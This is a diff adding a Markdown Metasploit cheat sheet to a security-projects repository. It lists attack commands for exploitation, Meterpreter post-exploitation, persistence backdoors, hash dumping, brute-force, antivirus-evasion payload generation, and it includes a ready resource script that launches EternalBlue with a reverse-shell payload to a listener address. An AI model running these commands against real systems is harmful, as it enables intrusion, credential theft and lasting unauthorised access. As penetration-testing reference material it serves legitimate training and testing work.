@@ -2,5 +2,192 @@ Cyber security Projects
 
 
 
+# **Metasploit Framework: A to Z Cheat Sheet (Beginner to Advanced)**  
 
-Metasploit
+Metasploit is a powerful penetration testing tool used for exploit development,
+vulnerability assessment, and post-exploitation. 
+
+
+
+### Launching Metasploit
+| Command |       Description |
+|----------------|-------------|
+| `msfconsole`   | Start the Metasploit console |
+| `msfdb init`   | Initialize the PostgreSQL database |
+| `msfdb start`  | Start the database service |
+| `msfdb stop`   | Stop the database service |
+| `msfdb status` | Check database status |
+| `msfupdate`    | Update Metasploit Framework |
+
+
+
+## Basic Commands & Navigation
+
+### Help & Information
+| Command | Description |
+|---------|-------------|
+| `help`               | Show all available commands |
+| `search [keyword]    | Search for modules (exploits, payloads, etc.) |
+| `info [module]       | Detailed info about a module |
+| `banner              | Display a random Metasploit banner |
+
+###  Module Management 
+| Command | Description |
+|---------|-------------|
+| `use [module_path]` | Load a module (e.g., `use exploit/windows/smb/ms17_010_eternalblue`) |
+| `back` | Exit the current module |
+| `show options` | Display configurable options for the current module |
+| `show payloads` | List compatible payloads for an exploit |
+| `show targets` | List supported target OS/versions |
+
+
+
+##   Exploitation 
+
+###  Setting Exploit Options
+| Command | Description |
+|---------|-------------|
+| `set RHOSTS [IP]` | Set target IP (e.g., `set RHOSTS 192.168.1.100`) |
+| `set RPORT [port]` | Set target port (e.g., `set RPORT 445`) |
+| `set LHOST [Your_IP]` | Set local IP for reverse shell |
+| `set LPORT [port]` | Set local port for reverse shell |
+| `set PAYLOAD [payload]` | Set payload (e.g., `set PAYLOAD windows/meterpreter/reverse_tcp`) |
+| `set SESSION [ID]` | Switch between sessions |
+
+###  Running Exploits
+| Command | Description |
+|---------|-------------|
+| `exploit` or `run` | Execute the exploit |
+| `check` | Check if target is vulnerable (not all exploits support this) |
+| `jobs` | List active background jobs |
+| `jobs -K` | Kill all jobs |
+
+
+
+##  Meterpreter: Post-Exploitation 
+
+###  Basic Meterpreter Commands 
+| Command | Description |
+|---------|-------------|
+| `sysinfo` | Get system information |
+| `getuid` | Check current user privileges |
+| `ps` | List running processes |
+| `migrate [PID]` | Migrate to another process |
+| `shell` | Drop into a system shell |
+| `exit` | Terminate Meterpreter session |
+
+### **Privilege Escalation**  
+| Command | Description |
+|---------|-------------|
+| `getsystem` | Attempt to elevate privileges (Windows) |
+| `run post/multi/recon/local_exploit_suggester` | Suggest local exploits |
+| `run post/windows/gather/win_privs` | Check Windows privileges |
+
+### **File System & Data Exfiltration**  
+| Command | Description |
+|---------|-------------|
+| `pwd` | Print working directory |
+| `cd [dir]` | Change directory |
+| `ls` | List files |
+| `download [file]` | Download a file from target |
+| `upload [file]` | Upload a file to target |
+| `search -f [filename]` | Search for files on target |
+
+### **Pivoting & Network Recon**  
+| Command | Description |
+|---------|-------------|
+| `ipconfig` / `ifconfig` | View network interfaces |
+| `arp` | Display ARP cache |
+| `route` | View network routes |
+| `run autoroute -s [subnet]` | Add route for pivoting |
+| `portscan [target] [ports]` | Scan ports from Meterpreter |
+
+---
+
+## **5. Advanced Techniques**  
+
+### **Persistence & Backdoors**  
+| Command | Description |
+|---------|-------------|
+| `run persistence -X -i [sec] -p [port] -r [IP]` | Create persistent backdoor |
+| `run metsvc` | Install Meterpreter service |
+| `run post/windows/manage/persistence_exe` | Advanced persistence |
+
+### **Passwords & Hashes**  
+| Command | Description |
+|---------|-------------|
+| `hashdump` | Dump Windows SAM hashes |
+| `run post/windows/gather/smart_hashdump` | Smart hash dumping |
+| `run post/linux/gather/hashdump` | Linux hash dump |
+| `use auxiliary/scanner/ssh/ssh_login` | SSH brute-force |
+
+### **Evasion & Anti-Virus Bypass**  
+| Command | Description |
+|---------|-------------|
+| `msfvenom -p [payload] LHOST=[IP] LPORT=[port] -f [format] -o [file]` | Generate payloads |
+| `set Encoder [encoder]` | Use encoders (e.g., `x86/shikata_ga_nai`) |
+| `set EnableStageEncoding true` | Enable staged encoding |
+
+---
+
+## **6. Auxiliary Modules**  
+
+### **Scanning & Enumeration**  
+| Command | Description |
+|---------|-------------|
+| `use auxiliary/scanner/portscan/tcp` | TCP port scanning |
+| `use auxiliary/scanner/smb/smb_version` | Detect SMB version |
+| `use auxiliary/scanner/ssh/ssh_version` | Detect SSH version |
+
+### **Brute-Force Attacks**  
+| Command | Description |
+|---------|-------------|
+| `use auxiliary/scanner/ssh/ssh_login` | SSH brute-force |
+| `use auxiliary/scanner/http/http_login` | HTTP login brute-force |
+| `use auxiliary/scanner/mysql/mysql_login` | MySQL brute-force |
+
+---
+
+## **7. Resource Scripts & Automation**  
+
+### **Running Resource Scripts**  
+| Command | Description |
+|---------|-------------|
+| `resource [script.rc]` | Execute commands from a script |
+| `makerc [file]` | Save executed commands to a script |
+
+### **Example `.rc` Script**  
+```bash
+# Example: Auto-exploit script
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+exploit
+```
+
+---
+
+## **8. Troubleshooting & Tips**  
+
+### **Common Issues**  
+- **Database not connecting?** → `msfdb reinit`  
+- **Exploit failing?** → Check `options`, `set VERBOSE true`  
+- **Session dies?** → Use `AutoRunScript` for auto-migration  
+
+### **Useful Shortcuts**  
+- `TAB` → Auto-complete  
+- `Ctrl+Z` → Background session  
+- `sessions -i [ID]` → Resume session  
+
+---
+
+## **Conclusion**  
+This cheat sheet covers **Metasploit from A to Z**, from basic exploitation to advanced post-exploitation. Bookmark it for quick reference during penetration tests!  
+
+🚀 **Happy Hacking!** (Ethically, of course.)  
+
+---
+
+**📌 Pro Tip:** Always update Metasploit (`msfupdate`) and use legal targets for testing.
